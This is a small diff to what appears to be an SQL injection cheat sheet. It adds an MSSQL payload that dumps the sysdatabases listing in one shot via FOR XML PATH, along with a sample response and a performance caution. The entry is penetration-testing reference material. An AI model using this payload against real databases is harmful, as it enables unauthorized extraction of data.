@@ -39,7 +39,19 @@ Host: hack-yourself-first.com
 ```
 
 ## Useful Queries
-* 
+
+**CAUTION**
+The following query should be executed with caution as it has the potential to impact the performance of MSSQL, depending on the size of the table entries returned. It is recommended to run it only when there is confidence that the returned row isn't excessively long.
+
+DUMP all in one shot using XML
+Request
+```
+(select * from master..sysdatabases) for xml PATH('')
+```
+Response
+```
+<name>master</name><dbid>1</dbid><sid>AQ==</sid><mode>0</mode><status>65544</status><status2>
+```
 
 ### Inspired by
 * https://blog.improsec.com/tech-blog/dangers-mssql-features-impersonation-amp-links
